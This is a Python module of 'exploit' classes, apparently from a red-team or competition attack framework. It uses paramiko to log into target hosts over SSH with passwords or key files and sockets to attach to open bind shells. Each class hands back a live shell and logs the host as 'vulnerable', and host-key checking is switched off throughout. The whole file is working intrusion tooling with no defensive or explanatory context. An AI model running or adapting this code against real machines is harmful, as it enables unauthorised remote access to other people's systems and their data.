from datetime import datetime
import paramiko
from shell_cl import *
import socket
import utils


# parent class for exploits
class exploit_class:

	def __init__(self, ip):
		self.ip = ip

	def get_shell(self):
		pass


# ssh into target machine
class ssh_pass(exploit_class):

	def __init__(self, ip, args):
		exploit_class.__init__(self, ip)
		# read in username and password
		if args['username'] != 'def':
			self.username = args['username']
		else:
			self.username = utils.read_creds(ip)
		self.password = args['password']

	def get_shell(self):
		# attempt to ssh in, return generic shell on success
		try:
			sshcon = paramiko.SSHClient()
			sshcon.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			sshcon.connect(hostname=self.ip, username=self.username, password=self.password, timeout=3)
			the_shell = ssh_shell(sshcon)
			utils.logme(self.ip + " vulnerable with password " + self.password + "\n")
			return the_shell
		except Exception as e:
			utils.logme(self.ip + " not vulnerable with password " + self.password + " error: " + str(e) + "\n")
			return e


# attempt to ssh in using keys
class ssh_key(exploit_class):

	# read in keys and username, key is a file in 'Key_Files' directory
	def __init__(self, ip, args):
		exploit_class.__init__(self, ip)
		self.username = args['username']
		self.key = args['key']

	# attempt to ssh in, return generic shell on success
	def get_shell(self):
		try:
			sshcon = paramiko.SSHClient()
			sshcon.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			sshcon.connect(hostname=self.ip, username=self.username, key_filename=self.key, timeout=3)
			the_shell = ssh_shell(sshcon)
			utils.logme(self.ip + " vulnerable with key " + self.key + "\n")
			return the_shell

		except Exception as e:
			utils.logme(self.ip + " not vulnerable key " + self.key + " error: " + str(e) + "\n")
			return e


# check for bind shells
class bind_shell(exploit_class):

	# take in ip and port as args
	def __init__(self, ip, args):
		exploit_class.__init__(self, ip)
		self.port = int(args['port'])

	# attempt to connect to socket, return generic shell on success
	def get_shell(self):
		try:
			sock = socket.socket()
			sock.settimeout(3.0)
			sock.connect((self.ip, self.port))
			utils.logme(self.ip + " open on port " + str(self.port) + "\n")
			return socket_shell(sock)
		except Exception as e:
			utils.logme(self.ip + " not open on port " + str(self.port) + " error: " + str(e) + "\n")
			return e




